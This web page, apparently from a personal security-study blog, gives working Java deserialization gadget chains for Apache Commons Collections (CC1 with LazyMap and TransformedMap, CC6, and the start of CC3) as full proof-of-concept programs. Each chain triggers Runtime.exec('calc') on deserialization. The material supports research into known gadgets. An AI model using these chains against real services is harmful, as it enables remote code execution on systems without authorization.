@@ -1,0 +1,856 @@
+<!DOCTYPE html>
+<html lang='en' dir='auto'><head>
+  <meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+<meta name='description' content='CC chain CC1_LazyMap import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CC1_LazyMap { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(&#34;getMethod&#34;,new Class[]{String.class,Class[].class},new Object[]{&#34;getRuntime&#34;,null}), new InvokerTransformer(&#34;invoke&#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;calc&#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.'>
+<meta name='theme-color' content='#00ffff'>
+
+<meta property='og:title' content='commons-collections • '>
+<meta property='og:description' content='CC chain CC1_LazyMap import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CC1_LazyMap { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(&#34;getMethod&#34;,new Class[]{String.class,Class[].class},new Object[]{&#34;getRuntime&#34;,null}), new InvokerTransformer(&#34;invoke&#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;calc&#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.'>
+<meta property='og:url' content='https://neryx.github.io/docs/java/javagadget/commons-collections/'>
+<meta property='og:site_name' content='Neryx&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='docs'><meta property='article:tag' content='JavaGadget'><meta name='twitter:card' content='summary'>
+
+<meta name="generator" content="Hugo 0.120.3">
+
+  <title>commons-collections • </title>
+  <link rel='canonical' href='https://neryx.github.io/docs/java/javagadget/commons-collections/'>
+  
+  
+  <link rel='icon' href='/favicon.ico'>
+<link rel='stylesheet' href='/assets/css/main.ab98e12b.css'><link rel='stylesheet' href='/css/custom.css'><style>
+:root{--color-accent:#00ffff;}
+</style>
+
+  
+
+</head>
+<body class='page type-docs has-sidebar'>
+
+  <div class='site'><div id='sidebar' class='sidebar'>
+  <a class='screen-reader-text' href='#main-menu'>Skip to Main Menu</a>
+
+  <div class='container'><section class='widget widget-about sep-after'>
+  <header>
+    
+    <div class='logo'>
+      <a href='/'>
+        <img src='/images/logo.png'>
+      </a>
+    </div>
+    
+    <h2 class='title site-title '>
+      <a href='/'>
+      Neryx&#39;s Blog
+      </a>
+    </h2>
+    <div class='desc'>
+    记录和分享
+    </div>
+  </header>
+
+</section>
+<section class='widget widget-search sep-after'>
+  <header>
+    <h4 class='title widget-title'>Search</h4>
+  </header>
+
+  <form action='/search' id='search-form' class='search-form'>
+    <label>
+      <span class='screen-reader-text'>Search</span>
+      <input id='search-term' class='search-term' type='search' name='q' placeholder='Search&hellip;'>
+    </label></form>
+
+</section>
+<section class='widget widget-sidebar_menu sep-after'><nav id='sidebar-menu' class='menu sidebar-menu' aria-label='Sidebar Menu'>
+    <div class='container'>
+      <ul><li class='item'>
+  <a href='/'>主页</a></li><li class='item has-current'>
+  <a href='/docs/'>文档</a></li><li class='item'>
+  <a href='/archive/'>归档</a></li><li class='item'>
+  <a href='/about/'>关于</a></li></ul>
+    </div>
+  </nav>
+
+</section><section class='widget widget-taxonomy_cloud sep-after'>
+  <header>
+    <h4 class='title widget-title'>Tags</h4>
+  </header>
+
+  <div class='container list-container'>
+  <ul class='list taxonomy-cloud'><li>
+        <a href='/tags/javabase/' style='font-size:1.6em'>JavaBase</a>
+      </li><li>
+        <a href='/tags/javagadget/' style='font-size:2em'>JavaGadget</a>
+      </li><li>
+        <a href='/tags/vulrecurrent/' style='font-size:1em'>VulRecurrent</a>
+      </li></ul>
+</div>
+
+
+</section>
+</div>
+
+  <div class='sidebar-overlay'></div>
+</div><div class='main'><a class='screen-reader-text' href='#content'>Skip to Content</a>
+
+<button id='sidebar-toggler' class='sidebar-toggler' aria-controls='sidebar'>
+  <span class='screen-reader-text'>Toggle Sidebar</span>
+  <span class='open'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="3" y1="12" x2="21" y2="12" />
+<line x1="3" y1="6" x2="21" y2="6" />
+<line x1="3" y1="18" x2="21" y2="18" />
+</svg>
+</span>
+  <span class='close'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="18" y1="6" x2="6" y2="18" />
+<line x1="6" y1="6" x2="18" y2="18" />
+</svg>
+</span>
+</button><div class='header-widgets'>
+        <div class='container'>
+    
+    <style>.widget-breadcrumbs li:after{content:'\2f '}</style>
+  <section class='widget widget-breadcrumbs sep-after'>
+    <nav id='breadcrumbs'>
+      <ol><li><a href='/'>主页</a></li><li><a href='/docs/'>文档</a></li><li><span>commons-collections</span></li></ol>
+    </nav>
+  </section></div>
+      </div>
+
+      <header id='header' class='header site-header'>
+        <div class='container sep-after'>
+          <div class='header-info'><p class='site-title title'>Neryx&#39;s Blog</p><p class='desc site-desc'>记录和分享</p>
+          </div>
+        </div>
+      </header>
+
+      <main id='content'>
+
+
+<article lang='en' class='entry'>
+  <header class='header entry-header'>
+  <div class='container sep-after'>
+    <div class='header-info'>
+      <h1 class='title'>commons-collections</h1>
+      
+
+    </div>
+    <div class='entry-meta'>
+  <span class='posted-on'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><rect x="3" y="4" width="18" height="18" rx="2" ry="2" />
+<line x1="16" y1="2" x2="16" y2="6" />
+<line x1="8" y1="2" x2="8" y2="6" />
+<line x1="3" y1="10" x2="21" y2="10" />
+</svg>
+<span class='screen-reader-text'>Posted on </span>
+  <time class='entry-date' datetime='0001-01-01T00:00:00Z'>0001, Jan 01</time>
+</span>
+
+  <span class='byline'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M21,21V20c0-2.76-4-5-9-5s-9,2.24-9,5v1" />
+<path d="M16,6.37A4,4,0,1,1,12.63,3,4,4,0,0,1,16,6.37Z" />
+</svg>
+<span class='screen-reader-text'> by </span><a href='/authors/%3cnil%3e'></a></span>
+  
+
+</div>
+
+
+  </div>
+</header>
+
+  
+  
+
+  <div class='container entry-content'>
+  <h2 id="cc-chain">CC chain</h2>
+<p><img src="https://cdn.jsdelivr.net/gh/N2ryx/Picture-bed@master/typora/image-20231219123305619.png" alt="image-20231219123305619"></p>
+<hr>
+<h2 id="cc1_lazymap">CC1_LazyMap</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.LazyMap;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Constructor;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.InvocationHandler;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Proxy;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Map;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC1_LazyMap</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(Runtime.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;getMethod&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>,Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;getRuntime&#34;</span>,<span style="color:#66d9ef">null</span>}),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;invoke&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Object.<span style="color:#a6e22e">class</span>,Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">null</span>,<span style="color:#66d9ef">null</span>}),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;exec&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;calc&#34;</span>})
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        ChainedTransformer chainedTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(transformers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span> map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
+</span></span><span style="display:flex;"><span>        Map<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span> lazyMap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(map,chainedTransformer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Class c <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span>);
+</span></span><span style="display:flex;"><span>        Constructor annotationInvocationHandlerConstructor <span style="color:#f92672">=</span> c.<span style="color:#a6e22e">getDeclaredConstructor</span>(Class.<span style="color:#a6e22e">class</span>,Map.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>        annotationInvocationHandlerConstructor.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        InvocationHandler h <span style="color:#f92672">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.<span style="color:#a6e22e">newInstance</span>(Override.<span style="color:#a6e22e">class</span>,lazyMap);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Map mapProxy <span style="color:#f92672">=</span> (Map) Proxy.<span style="color:#a6e22e">newProxyInstance</span>(LazyMap.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getClassLoader</span>(),<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Map.<span style="color:#a6e22e">class</span>},h);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Object o <span style="color:#f92672">=</span> annotationInvocationHandlerConstructor.<span style="color:#a6e22e">newInstance</span>(Override.<span style="color:#a6e22e">class</span>,mapProxy);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 序列化</span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream bos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(bos);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(o);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反序列化</span>
+</span></span><span style="display:flex;"><span>        ByteArrayInputStream bis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(bos.<span style="color:#a6e22e">toByteArray</span>());
+</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(bis);
+</span></span><span style="display:flex;"><span>        ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<h2 id="cc1">CC1</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.TransformedMap;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.*;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.annotation.Target;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Constructor;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Method;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Map;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC1_TransformedMap</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ChainedTransformer链式执行</span>
+</span></span><span style="display:flex;"><span>        Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(Runtime.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;getMethod&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>,Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;getRuntime&#34;</span>,<span style="color:#66d9ef">null</span>}),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;invoke&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Object.<span style="color:#a6e22e">class</span>,Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">null</span>,<span style="color:#66d9ef">null</span>}),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;exec&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;calc&#34;</span>})
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        ChainedTransformer chainedTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(transformers);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//        chainedTransformer.transform(Runtime.class);  // test</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span> map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
+</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;value&#34;</span>,<span style="color:#e6db74">&#34;abc&#34;</span>);  <span style="color:#75715e">// 添加键值对</span>
+</span></span><span style="display:flex;"><span>        Map<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span> transformedMap <span style="color:#f92672">=</span> TransformedMap.<span style="color:#a6e22e">decorate</span>(map,<span style="color:#66d9ef">null</span>,chainedTransformer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// AnnotationInvocationHandler类是default，不能直接获取</span>
+</span></span><span style="display:flex;"><span>        Class c <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span>);
+</span></span><span style="display:flex;"><span>        Constructor  annotationInvocationHandlerConstructor <span style="color:#f92672">=</span> c.<span style="color:#a6e22e">getDeclaredConstructor</span>(Class.<span style="color:#a6e22e">class</span>,Map.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>        annotationInvocationHandlerConstructor.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        Object o <span style="color:#f92672">=</span> annotationInvocationHandlerConstructor.<span style="color:#a6e22e">newInstance</span>(Target.<span style="color:#a6e22e">class</span>,transformedMap);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 序列化</span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream bos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(bos);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(o);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反序列化</span>
+</span></span><span style="display:flex;"><span>        ByteArrayInputStream bis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(bos.<span style="color:#a6e22e">toByteArray</span>());
+</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(bis);
+</span></span><span style="display:flex;"><span>        ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<h2 id="cc6">CC6</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.LazyMap;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.*;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Map;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC6</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(Runtime.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;getMethod&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>, Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;getRuntime&#34;</span>, <span style="color:#66d9ef">null</span>}),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;invoke&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Object.<span style="color:#a6e22e">class</span>, Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>}),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;exec&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;calc&#34;</span>})
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        ChainedTransformer chainedTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(transformers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span> map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
+</span></span><span style="display:flex;"><span>        Map<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span> lazyMap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(map,<span style="color:#66d9ef">new</span> ConstantTransformer(1));
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// &#34;aaa&#34; 绕开put</span>
+</span></span><span style="display:flex;"><span>        TiedMapEntry tiedMapEntry <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry(lazyMap,<span style="color:#e6db74">&#34;aaa&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span> hashMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
+</span></span><span style="display:flex;"><span>        hashMap.<span style="color:#a6e22e">put</span>(tiedMapEntry,<span style="color:#e6db74">&#34;bbb&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        lazyMap.<span style="color:#a6e22e">remove</span>(<span style="color:#e6db74">&#34;aaa&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Class c <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">class</span>;
+</span></span><span style="display:flex;"><span>        Field factoryFied <span style="color:#f92672">=</span> c.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;factory&#34;</span>);
+</span></span><span style="display:flex;"><span>        factoryFied.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        factoryFied.<span style="color:#a6e22e">set</span>(lazyMap,chainedTransformer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 序列化</span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream bos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(bos);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(hashMap);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反序列化</span>
+</span></span><span style="display:flex;"><span>        ByteArrayInputStream bis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(bos.<span style="color:#a6e22e">toByteArray</span>());
+</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(bis);
+</span></span><span style="display:flex;"><span>        ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<h2 id="cc3">CC3</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
